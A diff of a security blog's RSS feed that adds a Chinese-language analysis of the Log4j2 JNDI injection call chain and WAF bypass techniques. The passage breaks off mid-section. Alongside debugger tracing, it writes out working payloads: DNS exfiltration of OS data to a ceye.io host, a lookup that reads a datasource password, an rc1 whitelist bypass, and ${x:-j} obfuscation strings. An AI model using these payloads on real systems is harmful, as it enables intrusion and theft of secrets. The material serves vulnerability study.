@@ -10,7 +10,7 @@
         <title>MYZXCG</title>
         <link>https://myzxcg.com/</link>
         <description>专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～</description>
-        <generator>Hugo 0.91.0 https://gohugo.io/</generator>
+        <generator>Hugo 0.92.0 https://gohugo.io/</generator>
         
             <language>zh-CN</language>
         
@@ -23,10 +23,305 @@
         
             <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
         
-        <lastBuildDate>Thu, 13 Jan 2022 21:37:56 &#43;0800</lastBuildDate>
+        <lastBuildDate>Sun, 16 Jan 2022 15:53:38 &#43;0800</lastBuildDate>
         
             <atom:link rel="self" type="application/rss&#43;xml" href="https://myzxcg.com/rss.xml" />
         
+        
+            <item>
+                <title>Log4j2 利用链与Waf绕过分析</title>
+                <link>https://myzxcg.com/2022/01/Log4j2-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8EWaf%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/</link>
+                <guid isPermaLink="true">https://myzxcg.com/2022/01/Log4j2-%E5%88%A9%E7%94%A8%E9%93%BE%E4%B8%8EWaf%E7%BB%95%E8%BF%87%E5%88%86%E6%9E%90/</guid>
+                <pubDate>Sat, 15 Jan 2022 20:34:25 &#43;0800</pubDate>
+                
+                    <author>myzx.xcg@gmail.com (myzxcg)</author>
+                
+                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
+                
+                    <description>&lt;blockquote&gt;
+&lt;p&gt;log4j 2漏洞一个半月前就已经爆出来了，现在才发分析属实有点晚。主要因为前一段时间在忙着学习汇编。在闲暇的时候跟了一下log4 j2的调用过程，简单总结一下。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Log4j2是Apache的一个开源项目，使用Log4j2可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等。也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。&lt;/p&gt;
+&lt;h2 id=&#34;基本原理&#34;&gt;基本原理&lt;/h2&gt;
+&lt;h3 id=&#34;环境配置&#34;&gt;环境配置&lt;/h3&gt;
+&lt;p&gt;maven 导入log4j的jar包。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;nt&#34;&gt;&amp;lt;dependency&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;nt&#34;&gt;&amp;lt;groupId&amp;gt;&lt;/span&gt;org.apache.logging.log4j&lt;span class=&#34;nt&#34;&gt;&amp;lt;/groupId&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;nt&#34;&gt;&amp;lt;artifactId&amp;gt;&lt;/span&gt;log4j-core&lt;span class=&#34;nt&#34;&gt;&amp;lt;/artifactId&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;nt&#34;&gt;&amp;lt;version&amp;gt;&lt;/span&gt;2.14.1&lt;span class=&#34;nt&#34;&gt;&amp;lt;/version&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/dependency&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在工程目录resources下创建log4j2.xml。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;configuration&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;status=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;error&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;nt&#34;&gt;&amp;lt;appenders&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;c&#34;&gt;&amp;lt;!--配置Appenders输出源为Console和输出语句SYSTEM_OUT--&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;nt&#34;&gt;&amp;lt;Console&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;name=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Console&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;target=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;SYSTEM_OUT&amp;#34;&lt;/span&gt; &lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;c&#34;&gt;&amp;lt;!--配置Console的模式布局--&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;nt&#34;&gt;&amp;lt;PatternLayout&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;pattern=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %level %logger{36} - %msg%n&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;nt&#34;&gt;&amp;lt;/Console&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/appenders&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;nt&#34;&gt;&amp;lt;loggers&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;nt&#34;&gt;&amp;lt;root&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;level=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;info&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
+            &lt;span class=&#34;nt&#34;&gt;&amp;lt;appender-ref&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;ref=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Console&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;/&amp;gt;&lt;/span&gt;
+        &lt;span class=&#34;nt&#34;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt;
+    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/loggers&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;nt&#34;&gt;&amp;lt;/configuration&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;配置文件介绍&#34;&gt;配置文件介绍&lt;/h3&gt;
+&lt;p&gt;下面对配置文件中有关参数进行介绍&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Configuration&lt;/code&gt;为根节点，有status和monitorInterval等多个属性。status的值用于控制log4j2日志框架&lt;strong&gt;本身&lt;/strong&gt;的日志级别，一般不用设置。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Appenders&lt;/code&gt;是输出源，用于定义日志输出的地方。log4j2支持的输出源有Console、File、RollingRandomAccessFile、MongoDB、Flume等。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Console&lt;/code&gt;控制台输出源是将日志打印到控制台上，开发的时候一般都会配置，以便调试。
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;PatternLayout&lt;/code&gt; 控制台或文件输出源都必须包含一个PatternLayout节点，用于指定输出文件的格式。各标记符详细含义如下:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;%d{HH:mm:ss.SSS} 表示输出到毫秒的时间
+%t 输出当前线程名称
+%-5level 输出日志级别，-5表示左对齐并且固定输出5个字符，如果不足在右边补0
+%logger 输出logger名称，因为Root Logger没有名称，所以没有输出
+%msg 日志文本
+%n 换行
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Loggers&lt;/code&gt;日志器分&lt;code&gt;root日志器&lt;/code&gt;和&lt;code&gt;自定义日志器&lt;/code&gt;，当根据日志名字获取不到指定的日志器时就使用Root作为默认的日志器。自定义时需要指定每个Logger的名称、日志级别等。此外，还需要配置一个或多个输出源&lt;code&gt;AppenderRef&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;每个logger可以指定一个level，不指定时默认为ERROR。低于此等级的日志信息不会被记录，只有高于或等于此等级的信息会被记录。&lt;/p&gt;
+&lt;p&gt;级别由高到低共分为6个：&lt;code&gt;fatal, error, warn, info, debug, trace&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;调用过程分析&#34;&gt;调用过程分析&lt;/h3&gt;
+&lt;p&gt;POC:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;log4j2Exploit&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.logging.log4j.LogManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;org.apache.logging.log4j.Logger&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;run&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;kd&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Logger&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;logger&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;LogManager&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getLogger&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;args&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;n&#34;&gt;logger&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;${jndi:ldap://127.0.0.1:3890/test}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;跟进&lt;code&gt;logger.error()→logIfEnabled()→isEnabled()→filter()&lt;/code&gt; 中判断了当前调用的日志等级是否高于等于配置文件中配置的。（intLevel的值是日志等级越高，值就越小）
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116152734.png&#34; alt=&#34;&#34;&gt;
+判断完成后回到&lt;code&gt;logIfEnabled()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;再进入&lt;code&gt;logMessage()→...→tryLogMessage()→log()...-&amp;gt;tryAppend()→directEncodeEvent()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;直到&lt;code&gt;directEncodeEvent()&lt;/code&gt;函数之前没什么好说的，都是读取配置文件创建event事件等操作。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116152804.png&#34; alt=&#34;&#34;&gt;
+&lt;code&gt;this.getLayout()&lt;/code&gt; 获取配置文件里设置的输出格式，并调用encode()处理event。&lt;/p&gt;
+&lt;p&gt;紧接着调用了toText方法来用不同Converter处理传入的数据，并将结果存入buffer中。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116152824.png&#34; alt=&#34;&#34;&gt;
+这里解释一下这10个converter对象是干什么的：&lt;/p&gt;
+&lt;p&gt;比如第一个&lt;code&gt;DatePatternConverter&lt;/code&gt; 就是用来根据event对象中的&lt;code&gt;%d{yyyy-MM-dd HH:mm:ss.SSS}&lt;/code&gt;（也就是从配置文件中设置的） 转换成按照此格式的时间表示，并将值存在buffer中。所以同理，后面所有的converter就是按照配置文件中设置的输出格式转换为对应的值，并将结果添加到buffer中。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116152843.png&#34; alt=&#34;&#34;&gt;
+输入&lt;code&gt;${jndi:ldap://127.0.0.1:3890/test}&lt;/code&gt;对应的是&lt;code&gt;%msg&lt;/code&gt;，处理的converter是&lt;code&gt;MessagePatternConverter&lt;/code&gt;，也就是i=8，跟进它的format()。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116152923.png&#34; alt=&#34;&#34;&gt;
+首先通过&lt;code&gt;event.getMessage()&lt;/code&gt;获取到Message对象。再重新创建一个StringBuilder对象&lt;code&gt;workingBuilder&lt;/code&gt;，将之前coverter格式化好的部分赋值给&lt;code&gt;workingBuilder&lt;/code&gt;，并添加msg对应的字符串给此对象。&lt;/p&gt;
+&lt;p&gt;然后从之前coverter格式化好的字符串末尾开始，遍历之后的&lt;code&gt;workingBuilder&lt;/code&gt;字符串，直到找到&lt;code&gt;${&lt;/code&gt; 起始的位置。找到后将&lt;code&gt;${&lt;/code&gt;到整个字符串末尾的值复制给value，并将&lt;code&gt;workingBuilder&lt;/code&gt;的长度设置为之前未拼接msg的长度，并重新添加&lt;code&gt;this.config.getStrSubstitutor().replace(event, value)&lt;/code&gt; 的值到&lt;code&gt;workingBuilder&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;这段操作意思: 如果msg中存在&lt;code&gt;${&lt;/code&gt;字符串，取出msg值后，就将整个msg字符串从&lt;code&gt;workingBuilder&lt;/code&gt;中替换掉。&lt;/p&gt;
+&lt;p&gt;然后跟入replace函数。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116152951.png&#34; alt=&#34;&#34;&gt;
+这里主要是对传入的msg字符串进行处理，循环查找以&lt;code&gt;${&lt;/code&gt;字符串开头和以&lt;code&gt;}&lt;/code&gt;字符串结束的位置，获取两者之间字符串，即&lt;code&gt;jndi:ldap://127.0.0.1:3890/test&lt;/code&gt;。（同时还会递归判断这个字符串中是否还有&lt;code&gt;${&lt;/code&gt;与&lt;code&gt;}&lt;/code&gt;）&lt;/p&gt;
+&lt;p&gt;最后进入&lt;code&gt;resolveVariable()&lt;/code&gt; 方法。支持的Interpolator类型。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116153016.png&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116153032.png&#34; alt=&#34;&#34;&gt;
+通过 &lt;code&gt;var.indexOf(58)&lt;/code&gt;获取&lt;code&gt;:&lt;/code&gt;号的索引位置，得到Interpolator前缀。再根据对应的前缀调用lookup方法。&lt;/p&gt;
+&lt;p&gt;进入到log4j的JndiLookup类的lookup方法中，通过jndi调用lookup。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116153059.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;利用与绕过&#34;&gt;利用与绕过&lt;/h2&gt;
+&lt;h3 id=&#34;利用姿势&#34;&gt;利用姿势&lt;/h3&gt;
+&lt;p&gt;关于JNDI 的利用方式，可参考之前写的文章&lt;a href=&#34;https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/&#34;&gt;Java-JNDI分析与利用&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;前面分析中可以看到，能利用的不止JNDI前缀。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;runtime&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vm&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;os&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;//获取java运行时版本，jvm版本，和操作系统版本
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sys&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;外带数据: &lt;code&gt;${jndi:ldap://${java:os}.2lnhn2.ceye.io}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;还可利用Bundle协议读取项目配置文件来获取敏感信息。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;${bundle:application:spring.datasource.password}&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;2150-rc1-绕过&#34;&gt;2.15.0 rc1 绕过&lt;/h3&gt;
+&lt;p&gt;这个绕过有点鸡肋，需要修改配置，默认配置下是不能触发JNDI远程加载的。&lt;/p&gt;
+&lt;p&gt;简单说一下变化:&lt;/p&gt;
+&lt;p&gt;前面用到的&lt;code&gt;MessagePatternConverter&lt;/code&gt;这个converter 变成了&lt;code&gt;MessagePatternConverter$SimpleMessagePatternConverter&lt;/code&gt;
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116153123.png&#34; alt=&#34;&#34;&gt;
+可以看到没有像MessagePatternConverter那样对传入的数据进行${ 判断。而是在LookupMessagePatternConverter.format()方法中才进行了判断，并调用replaceIn()。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116153146.png&#34; alt=&#34;&#34;&gt;
+然而要触发这个converter，需要修改配置文件，在%msg的后面添加一个{lookups}。&lt;/p&gt;
+&lt;p&gt;同时JndiManager.lookup方法增加了白名单校验，当以ldap和ldaps协议请求就会判断请求的host。白名单里只允许本机地址。&lt;/p&gt;
+&lt;p&gt;按理说是无解的，但是在JndiManager.lookup方法中，在捕获异常后没有进行任何操作，从而能走到&lt;code&gt;this.context.lookup()&lt;/code&gt; 。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116153309.png&#34; alt=&#34;&#34;&gt;
+所以只要让lookup方法在执行的时候抛个异常即可。&lt;/p&gt;
+&lt;p&gt;payload: &lt;code&gt;${jndi:ldap://xxx.xxx.xxx.xxx:xxxx/ ExportObject}&lt;/code&gt;。在url 中增加一个空格，就会导致报错。这样连针对host的校验都能绕过。&lt;/p&gt;
+&lt;p&gt;修复: 在rc2中，catch之后就直接return了(2.15.0稳定版本不受影响)。&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;Tips:&lt;/strong&gt;&lt;/em&gt; 提一下&lt;code&gt;2.0-beta7 ≤ Log4j 2.x ≤ 2.17.0&lt;/code&gt;（2.3.2 和 2.12.4 版本不受影响），如果配置文件可控，利用Log4j2 提供的 JDBCAppender 功能可以导致JNDI注入。在&lt;code&gt;Log4j2 ≤ 2.16.0&lt;/code&gt;的版本由于substitute函数的递归解析还能导致拒绝服务攻击。&lt;/p&gt;
+&lt;h3 id=&#34;waf-绕过&#34;&gt;WAF 绕过&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;绕过方法一&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;前面提到过在处理&lt;code&gt;${jndi:ldap://127.0.0.1:3890/test}&lt;/code&gt;的时候会递归处理。首先循环查找&lt;code&gt;${&lt;/code&gt; 和&lt;code&gt;}&lt;/code&gt; 的位置，获取两者之间的字符串。前面没有说的是，找完&lt;code&gt;${&lt;/code&gt; 和&lt;code&gt;}&lt;/code&gt;之后它还会查找&lt;code&gt;:-&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;以&lt;code&gt;${${,:-j}ndi:ldap://127.0.0.1:3890/test}&lt;/code&gt; 为例:
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116153332.png&#34; alt=&#34;&#34;&gt;
+如果找到就截取&lt;code&gt;:-&lt;/code&gt;之前的变量赋值给varName，截取&lt;code&gt;:-&lt;/code&gt;到末尾的字符串赋值为varDefaultValve，然后就跳出循环。&lt;/p&gt;
+&lt;p&gt;然后使用resolveVariable() 对varName的内容进行判断，如果不匹配任何log4j2支持的协议，就返回null（这里varName的值为&lt;code&gt;,&lt;/code&gt;）。之后就会把varDefaultValve的值（这里为&lt;code&gt;j&lt;/code&gt;）赋给varValue。然后再用varValue替换整个&lt;code&gt;${,:-j}&lt;/code&gt; ，即最后结果为&lt;code&gt;jndi:ldap://127.0.0.1:3890/test&lt;/code&gt; 。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116153351.png&#34; alt=&#34;&#34;&gt;
+所以绕过方法可以是:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;${任意字符串:-实际想要的字符串} = 实际想要的字符串&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;注意这里的任意字符串不能为log4j2 支持的Interpolator前缀。&lt;/p&gt;
+&lt;p&gt;例如: &lt;code&gt;${${fdafasdfasdfasfdas:-j}ndi:ldap://127.0.0.1:3890/test}&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;绕过方法二&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;可以看看log4j2所支持的Interpolator前缀，有哪些支持对字符串的处理。
+&lt;img src=&#34;https://myzxcg.com/images/image-20220116153417.png&#34; alt=&#34;&#34;&gt;
